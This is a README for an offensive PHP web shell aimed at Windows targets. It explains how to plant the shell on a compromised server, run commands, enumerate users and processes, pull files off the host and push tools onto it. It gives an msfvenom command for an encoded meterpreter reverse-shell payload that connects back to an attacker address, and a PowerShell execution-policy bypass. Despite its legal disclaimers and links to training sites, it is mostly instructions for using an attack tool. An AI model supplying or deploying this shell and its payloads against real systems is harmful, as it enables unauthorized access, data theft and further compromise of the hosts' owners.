<h1> The Not-So Simple PHP Command Shell</h1>
<img src="/img/nsscmdshell.png" />
<h2>Foreword:</h2>
<blockquote>Please note that gaining access to the target is beyond the scope of this writing and your responsibility to establish in a manner consistent with established law.  This tool is intended to be used for on target enumeration to gather and exfiltrate information and then to upload and execute tools such as netcat or msvenom payload for further access to the target. The following websites provide training resources and practice scenarios and are excellent resources for learning such skills:
		<ul>
			<li>https://www.hackthebox.eu/</li>
			<li>https://tryhackme.com/</li>
	    </ul>
		  </blockquote>
<p>Automates or simplifies many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:<br> 
venom.exe : <code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe</code>
</p>

<img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif" />
<h2>Automates or simplifies many on target enumeration functions. Including:</h2>
<ul>
<li>Simple system commands</li>
<li>File upload/download options</li>
<li>simple user manipulations (on compatible targets with sufficient privileges)</li>
<li>One click user info/ user permissions info</li>
<li>One click systeminfo</li>
<li>One Click processes list</li>
<li>One click file cleanup removes all files uploaded with this tool</li>
</ul>

<h2>How to use it</h2>
<p>First, change the variables, "$attackip" and "$attackport" to the appropriate values for YOUR attack machine:</p>
<code>$attackip = "10.0.2.6";</code><br>
<code>$attackport = "8000";</code>

<p>Now get "nsscmdshell.php" onto the target < - DISCLAIMER (in a manner consistent with applicable laws - and within scope of a written contract where required) - >.</p>

<p>Once the nsscmdshell is uploaded, typing valid commands into the command input or clicking the various cmd buttons will display the results in a windows command prompt style below the nsscmdshell interface.</p>
<img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-output.png" />

<h6>The upload and download options are self explanatory, but just to avoid any confusion: </h6>

<p>If using the select field, choose your file and click "upload". Files linked in the select field options need to be present at the web root at the ip address and port in lines 10 and 11 of nsscmdshell.php.<sup>1</sup> </p>

<p>If using the open file dialog option, only files present at the ip address and port specified can be uploaded.</p>

<p>For the download option, simply enter the filename to be downloaded from the working directory of the target machine. Please note that files which can be managed by your browser will be opened in your browser - i.e., entering a text or html file to be downloaded will instead open the file in the web browser.<br>   
Example usage: run jaws-enum.ps1 - output to jaws.txt <code>powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.txt</code>, then download the output file to your attack machine for later close examination.<br><br>
<img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-jaws.png" />
</p>

<p>The quick command buttons each have a title attribute with a brief description of the function - hover over the button to see the description.<br>
<img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-title-desc.png" /><br>
It goes without saying that the effectiveness of the various functions depends on the target os's support of the functions and the current user's permissions. This was designed for and tested on Windows XP - Windows 8.1 with very limited testing on Win10.</p> 

*** Got "Warning: file_get_contents(http://XX.XX.XX.XX:XXXX/filename.ext):failed to open stream: No connetion could be made...." error? 
 Two possible causes:</p>
 <ol>
 <li> You didn't set the variables, <code>$attackip</code> and <code>$attackport</code> to your machine. Fix: ifconfig your ip, and set in nsscmdshell.php lines 10 and 11.</li> 
 <li> The files are not available on the defined server or port, or there is no server running on the defined port. Fix: <code>python3 -m http.server XXXX</code> in a directory containing the files you're attempting to upload.</li>
 </ol>
<h3>Footnotes:</h3> 
<p><sub>1</sub> I generally cd into my "windowstools" folder and start a simple http server:<br>
<code>cd windowstools</code><br>
<code>python3 -m http.server 8000</code>.<br>
<br>
<img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-listening.png" /></p>

<img src="http://www.hackthebox.eu/badge/image/476578" alt="Hack The Box">